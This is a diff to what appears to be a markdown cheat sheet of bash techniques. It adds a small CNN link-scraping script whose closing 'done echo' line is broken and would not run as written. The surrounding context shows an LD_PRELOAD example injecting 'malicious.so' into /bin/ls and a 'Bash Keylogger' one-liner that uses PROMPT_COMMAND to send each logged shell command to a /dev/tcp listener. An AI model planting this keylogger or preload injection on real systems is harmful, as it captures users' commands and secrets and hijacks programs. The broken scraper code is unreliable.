@@ -232,6 +232,27 @@ If you set LD_PRELOAD to the path of a shared object, that file will be loaded b
 LD_PRELOAD=/path/to/my/malicious.so /bin/ls
 ```
 
+## Bash Webscraper:
+
+```bash
+#!/bin/bash
+
+# Define the URL to scrape
+base_url="https://lite.cnn.com"
+url="https://lite.cnn.com/"
+
+# Create a CSV file and add a header
+echo "Link,Title" > cnn_links.csv
+
+# Extract links and titles and save them to the CSV file
+link_array=($(curl -s "$url" | awk -F 'href="' '/<a/{gsub(/".*/, "", $2); print $2}'))
+
+for link in "${link_array[@]}"; do full_link="${base_url}${link}"
+    title=$(curl -s "$full_link" | grep -o '<title[^>]*>[^<]*</title>' | sed -e 's/<title>//g' -e 's/<\/title>//g')
+    echo "\"$full_link\",\"$title\"" >> cnn_links.csv
+done echo "Scraping and CSV creation complete. Links and titles saved to 'cnn_links.csv'."
+```
+
 ## Bash Keylogger:
 
 ```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```
